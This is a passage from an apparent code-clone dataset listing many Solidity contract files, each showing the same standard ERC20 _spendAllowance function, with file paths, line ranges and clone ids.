            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xb3F23B54930Fa83b12A26eD228E431C4A6187590.sol" startline="125" endline="135" pcid="6573">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x156ba8A652411cd1F4fFbdA89f96172d5C76bD3A.sol" startline="215" endline="225" pcid="624">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xA55a6E9BFC3Ba7cb2421146B8F111919bCfB0060.sol" startline="121" endline="131" pcid="6027">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x249f6849814bfaeda890588e404030eccdefb1c6.sol" startline="122" endline="132" pcid="1138">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x99D00D99221a9CFF03d0F48a6674b71A7d0893Fc.sol" startline="117" endline="127" pcid="5598">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x34273fc3ff3f50Bef36ee6b4E999872aFddC4127.sol" startline="118" endline="128" pcid="1633">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x729841D06c8D569c8Dc118d9f6a5c663583d709F.sol" startline="125" endline="135" pcid="4217">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x033Be8705C262bb2A12da0274297790e9479CCe1.sol" startline="122" endline="132" pcid="147">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xc05CA5129c0D91f039B22C3f47FD82077adA63f6.sol" startline="122" endline="132" pcid="6876">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x3c9176ca5edd24a65e938e37729e717a3776ed06.sol" startline="136" endline="146" pcid="2157">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xB34429e7E522e8cDdDC4D4a49E98E073bdfEa29a.sol" startline="107" endline="117" pcid="6558">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x8af00a1f259F6183e35A21F47a3087489eECBF86.sol" startline="125" endline="135" pcid="5153">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xea0C5622A2E88392b1edb53e495a28491aC11fBA.sol" startline="127" endline="137" pcid="8476">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x6e7C09630F36B5f34459750c9717C4De1AE94165.sol" startline="121" endline="131" pcid="4068">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x2f6935cc4a043c0bf69165c791ce6f4361278715.sol" startline="125" endline="135" pcid="1452">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x9a5d0F32B00BDB418D7667AE36d36eA15FDe594e.sol" startline="123" endline="133" pcid="5636">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xc9e2d2a161445b4602d1908dae1a4ad90e3f1b49.sol" startline="124" endline="134" pcid="7196">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xF0098c03f5544FcC13F8f4DeB183527801B6B40D.sol" startline="124" endline="134" pcid="8804">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xFB1eef96272C53D608d11de7a92B1e7a0abF7DFc.sol" startline="126" endline="136" pcid="9136">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x71D87A7100c195679C7731039d37EFBfF1c19e6a.sol" startline="215" endline="225" pcid="4178">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x31dD70842e7443108905d50c216F2CeDb452E80a.sol" startline="125" endline="135" pcid="1570">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xf34839a7431d6c70673f3a3bcfb589c042fd219d.sol" startline="118" endline="128" pcid="8858">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x6bd91799f767b30b1f7aeb1239b3573b2e366b49.sol" startline="122" endline="132" pcid="3963">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x22348b2351817d12C0a89c35AF96B919544D7398.sol" startline="122" endline="132" pcid="1042">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xBf2A2Cb09E5d0714977A57C3f1e95a8682233099.sol" startline="125" endline="135" pcid="6847">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xAA2C33d58Ce20Efa76C1D131562e0c4177bc9E28.sol" startline="127" endline="137" pcid="6206">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xe542Cc82fcd14a249D0Bc3835ef4e3730616b190.sol" startline="127" endline="137" pcid="8296">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xecF790443697567D67022c757ABE80ac4648dA0E.sol" startline="125" endline="135" pcid="8678">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xAAb2332D528D2C636a3c1F47dF49472A9341149b.sol" startline="125" endline="135" pcid="6236">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x7620F8bE1A98a4F0CE86B9817767dc565C56eDF3.sol" startline="122" endline="132" pcid="4394">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xAe5A5174359c2c77D60aBCff529308266aa32c5e.sol" startline="124" endline="134" pcid="6326">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xe75e3c43e328F92a66e787b5e4B81f5A271a78a5.sol" startline="121" endline="131" pcid="8356">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x8d1Ac863255DFA88B9028eC119f12ABC1062b767.sol" startline="122" endline="132" pcid="5178">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x879ef12F70c31BfB91b7Fd74f74C71bb132D8e3a.sol" startline="119" endline="129" pcid="5039">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x75774b445262eE2952CF1a26b5d735Fe648FCE28.sol" startline="125" endline="135" pcid="4339">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xcfd07da825fbc71855ce35cc5953336b23e27a82.sol" startline="122" endline="132" pcid="7434">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x22E7f1B1300DBd955C689ac4Da292f938A4AEBFA.sol" startline="123" endline="133" pcid="1057">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x0f572144eaCF6e05F6c82b764CD1c722a6b22723.sol" startline="128" endline="138" pcid="410">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x248B4A2b9897b72994722C0e259BC1Eca38eAbf0.sol" startline="125" endline="135" pcid="1118">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x3943a56c7b1efd43c3c952aec05cb295f0ab8c67.sol" startline="119" endline="129" pcid="1906">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x0ae9C5Dd26C9903C66D060f1f6F661016B2b844f.sol" startline="122" endline="132" pcid="299">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x2fE58503d325203E80Ed379cE24a9AB5b5f56aEa.sol" startline="121" endline="131" pcid="1467">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x6FB11C60e84916968b4c70ca80889BD13fbEDA9b.sol" startline="124" endline="134" pcid="4084">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x9f111397a5A114654A9A6Aa6b3Cd35fbC4500a88.sol" startline="121" endline="131" pcid="5741">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x9074b21AB3452ABC15F7e15B6b7233EBe9Ed731f.sol" startline="449" endline="459" pcid="5289">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x99E6b2939603Ac9F9daF3f441f1A1A05b6d54c1f.sol" startline="123" endline="133" pcid="5616">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x3bcddA8f67A88449e3a6aEA912f860F28DE1A03a.sol" startline="122" endline="132" pcid="2072">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xdd160949e087Ef040BbFde43E454BA45dF2E8B52.sol" startline="126" endline="136" pcid="7867">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x66bc620635dd4e5bebdc135489e7cb6f660b2064.sol" startline="118" endline="128" pcid="3846">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x1A2d73a3c991da558bcAeE1f02408fe5a9471afa.sol" startline="122" endline="132" pcid="841">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xe57f93Bc66faffdC06eabEf8dB45e1fF28Bf67d3.sol" startline="125" endline="135" pcid="8311">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x2116bc152192df8a87eb74dc69aa64f6f476f792.sol" startline="124" endline="134" pcid="1012">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x2e45211957ECDd650F0eAA42f6D58F03D58159e0.sol" startline="125" endline="135" pcid="1407">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xCE641a63a438f15A3929C0A66b1428448ccfFaae.sol" startline="127" endline="137" pcid="7348">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xB1426cE1931Bc2f72fF5eEcFf831679B1fe52c3b.sol" startline="120" endline="130" pcid="6523">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xc49a9fe7c7B41545edfF6B2F2be7662EB588279C.sol" startline="226" endline="236" pcid="7090">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xB264455716277D6D1445A4B875efAb6DE8931F4a.sol" startline="121" endline="131" pcid="6545">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x67d726579cdb18830da61472da171f56028b0df1.sol" startline="121" endline="131" pcid="3861">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x341F7b39D375195870915b0744c90D3c6459EEdd.sol" startline="122" endline="132" pcid="1618">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x82f8c11f816693442b3a7d38cfba92abc7f356b0.sol" startline="124" endline="134" pcid="4924">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x70d8b31f4eeE0E9988D0b196531205A9D30Ad104.sol" startline="125" endline="135" pcid="4162">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x707dAb814AAE29c506EAfc8036b64066FC403444.sol" startline="121" endline="131" pcid="4140">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x8d9579e8591826ef37C80f680e33B6C8c38baB47.sol" startline="123" endline="133" pcid="5193">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x7E6d55c8dF6E82AfbC76620561cFB99196aC090c.sol" startline="122" endline="132" pcid="4698">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xE29128019902c7B59CEb2A145D7FBFdA58b0ab02.sol" startline="128" endline="138" pcid="8175">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xEb91539BFB1eF16F43Dd4E9c81e4d92f56450Cff.sol" startline="122" endline="132" pcid="8591">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xe0A9b2Cbd7147f9fb0fE09fAcD2aAB94C0f51444.sol" startline="741" endline="751" pcid="8083">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xDe77F59a385B50d78aeB7C646d9dF1E4fD76f1a4.sol" startline="126" endline="136" pcid="7951">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xD779eC84BC7681f2d2c51799bCF0A362b5130044.sol" startline="122" endline="132" pcid="7705">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xe6817d8DC697e075e23273385e97D3528Ddd08d1.sol" startline="122" endline="132" pcid="8341">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xAD7052E3511E19a82705E06756cF087A36B68e4a.sol" startline="122" endline="132" pcid="6311">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x033B28BE598a95363830624C0601E58AB03e9922.sol" startline="124" endline="134" pcid="132">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
